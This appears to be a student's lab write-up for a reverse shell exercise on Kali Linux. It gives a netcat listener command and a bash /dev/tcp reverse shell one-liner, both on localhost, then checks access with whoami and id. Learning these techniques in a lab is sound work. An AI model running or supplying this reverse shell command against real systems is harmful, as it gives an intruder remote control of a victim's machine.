# Task 3: Reverse Shell Practical Setup

## Environment
- OS: Kali Linux (Primary OS)
- Attacker & Victim: Same machine (`127.0.0.1`)

## Steps
1. Attacker terminal: `nc -nvlp 4444`
2. Victim terminal: `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`
3. Connection established → shell access verified with `whoami`, `id`, `pwd`

## Issues & Fixes
- None faced — worked smoothly on Kali Linux

## Screenshots
![Victim Command](victim-terminal.png)  
![Attacker Shell](attacker-terminal.png)

## Key Takeaways
- Reverse shells can be safely tested on localhost.
- Verification commands confirm successful access.
- Essential skill for ethical hacking and defense.
